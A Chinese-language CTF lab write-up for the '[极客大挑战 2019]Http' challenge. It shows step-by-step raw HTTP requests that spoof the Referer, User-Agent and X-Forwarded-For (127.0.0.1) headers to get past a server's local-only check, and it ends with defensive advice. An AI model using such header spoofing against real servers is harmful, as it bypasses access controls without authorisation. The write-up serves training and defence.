# CTF 练习：[极客大挑战 2019]Http —— 伪造请求头绕过三层校验

> 平台：CTF 训练平台（TCP 靶机模式，题目 `[1.3.5 案例解析][极客大挑战 2019]Http`）
> 环境：Kali Linux + openssl s_client（SSL 连接到靶机端口，手动发 HTTP 请求）
> 日期：2026-11-10
> 性质：平台提供的授权靶场

---

## 一、目标

靶机只给一个 TCP 端口，需要用 `openssl s_client` 连上去后**手工发送 HTTP 请求**，逐层满足服务器要求，最终拿到 flag。

## 二、环境说明

| 项 | 值 |
|---|---|
| 靶机地址 | 形如 `xxxx.tcp-ctf2.dasctf.com:9999` |
| 连接方式 | `openssl s_client -connect host:9999 -servername host` |
| 协议 | HTTPS（自签证书，`verify error: self-signed certificate` 属正常） |
| 请求方式 | 连上后手打 HTTP/1.1 请求，**空行结尾** |

> 每次请求带 `Connection: close`，服务器回完即断开，所以要**重连**（`↑` 调出命令再回车）才能发下一个请求。

## 三、复现过程

### 3.1 第一发：直接访问 /Secret.php

```
GET /Secret.php HTTP/1.1
Host: xxxx.tcp-ctf2.dasctf.com:9999
Connection: close

```

响应：

```html
<title>SyCsecret</title>
<h1>It doesn't come from 'https://Sycsecret.buuoj.cn'</h1>
```

**提示：Referer 不对。**

### 3.2 第二发：加 Referer

```
GET /Secret.php HTTP/1.1
Host: xxxx.tcp-ctf2.dasctf.com:9999
Referer: https://Sycsecret.buuoj.cn
Connection: close

```

响应：

```html
<h1>Please use "Syclover" browser</h1>
```

**提示：User-Agent 不对。**

### 3.3 第三发：加 User-Agent

```
GET /Secret.php HTTP/1.1
Host: xxxx.tcp-ctf2.dasctf.com:9999
Referer: https://Sycsecret.buuoj.cn
User-Agent: Syclover
Connection: close

```

响应：

```html
<h1>No!!! you can only read this locally!!!</h1>
```

**提示：只允许本地访问。**

### 3.4 第四发：加 X-Forwarded-For

```
GET /Secret.php HTTP/1.1
Host: xxxx.tcp-ctf2.dasctf.com:9999
Referer: https://Sycsecret.buuoj.cn
User-Agent: Syclover
X-Forwarded-For: 127.0.0.1
Connection: close

```

响应：

```html
<h1>CTF2{...}</h1>
```

**拿到 flag。**

## 四、原理：为什么能绕过

| 请求头 | 服务器拿它干什么 | 为什么不可信 |
|---|---|---|
| `Referer` | 判断「你从哪个页面点过来的」 | 完全由客户端填写，随便改 |
| `User-Agent` | 判断「你用什么浏览器」 | 同上，curl/脚本都能随意设置 |
| `X-Forwarded-For` | 判断「你的真实 IP」 | 是代理**附加**的头，客户端也可以直接伪造 |

**结论：任何把请求头当成「安全凭证」的做法都能被绕过。** 请求头是「声明」，不是「证明」。

## 五、正确做法

| 需求 | 错误做法 | 正确做法 |
|---|---|---|
| 限制来源页面 | 校验 Referer | 用 CSRF Token / 鉴权 |
| 限制客户端 | 校验 User-Agent | 不可作为安全边界 |
| 限制 IP | 信任 XFF | 网络层 ACL；若在代理后，只信任**自己的代理**追加的值，并剥离客户端传入的 XFF |
| 敏感资源 | 靠「本地访问」 | 真正的认证授权 + 最小权限 |

## 六、踩坑

1. **TCP 靶机不是网址**：不能浏览器直接打开，必须用 openssl/nc 连端口后手发请求。
2. **请求必须以空行结束**：`Connection: close` 之后再按一次回车，否则服务器不响应。
3. **每次都要重连**：`Connection: close` 后连接断开，`↑` 调出命令重新连。
4. **路径大小写**：`/Secret.php` 的 S 是大写。
5. `SSL_shutdown: shutdown while in init` 是正常现象，不用管。
6. **提示要照抄**：`https://Sycsecret.buuoj.cn` 写错一个字符就过不了。

## 七、收获

- 亲手理解了 HTTP 报文结构：请求行、请求头、空行、正文。
- 理解了 `Referer` / `User-Agent` / `X-Forwarded-For` 三个头的真实含义和伪造方式。
- **安全启示**：请求头是客户端可完全控制的数据，不能作为任何安全判断的依据。
